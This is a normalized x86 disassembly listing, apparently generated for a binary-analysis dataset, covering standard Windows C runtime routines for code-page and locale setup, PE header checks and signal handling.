call sub_10016806
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001c2a7
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10010b6c
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001c95c
mov eax [ ebp - 0x1c ]
sub_1001c966
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_100190d8
push eax
call sub_1001fec3
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_10013458
add eax 0x20
cmp esi eax
jne r-xdata
call sub_10013458
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_100166a9
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_1001ca02
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_1001178a
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_1001ca36
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1001ca65
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_10011a90
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1001cac9
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_1001ed8a
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10017034
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10017034
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_10011a90
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_1001cc5c
push 0xc
push r--data
call sub_10018984
call sub_10017c1c
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_1001a48a
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001ccf7
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_100189c9
retn
push 0x20
call sub_10013ae8
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_10011c31
pop ecx
sub_1001cd00
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_100137b8
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1001cd7c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_1001cd00
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_1001ca65
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10011a90
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1001ca36
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_1001cac9
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10011a90
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1001ca36
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_1001cf61
push 0x14
push r--data
call sub_10018984
or [ ebp - 0x20 ] 0xffffffff
call sub_10017c1c
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1001cc5c
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_1001cd00
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_100166a9
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_100189c9
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1001cd7c
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_100167f3
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_10011c31
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_10011c31
pop ecx
push 0xd
call sub_1001a48a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001d0c2
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_10011c31
pop ecx
sub_1001d119
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_100137b8
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1001f196
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_1001ed8a
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1001d1d1
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_10017955
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_1001d200
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_1001d240
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1001d290
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_100189e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_1001d200
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_1001d240
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1001d399
push 0x8
push r--data
call sub_10018984
push [ rw-data ]
call sub_100179d0
pop ecx
test eax eax
je r-xdata
call sub_1001d34d
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001d400
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_1001d444
push 0x20
push r--data
call sub_10018984
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_10017ba3
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_100189c9
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_1001d400
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_10013d6e
mov [ ebp - 0x1c ] 0x1
push eax
call sub_100179d0
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_100167f3
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10010b6c
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_1001a48a
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_100179c7
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001d5b8
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_1001d612
push 0x10
push r--data
call sub_10018984
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_100189c9
retn
sub_1001d680
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_1002144c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_1002144c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1001d6cc
push 0x10
push r--data
call sub_10018984
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_100167f3
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1001b4b7
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_100189c9
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001d766
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_1001d76f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
movzx ecx [ eax + 0x42 ]
movzx edx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
test esi esi
jne r-xdata
and [ ebp - 0xc ] 0x0
push ebx
push edi
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ecx
xor ebx ebx
inc ebx
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
push esi
push 0x37
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push [ ebp - 0x4 ]
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_10018de6
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
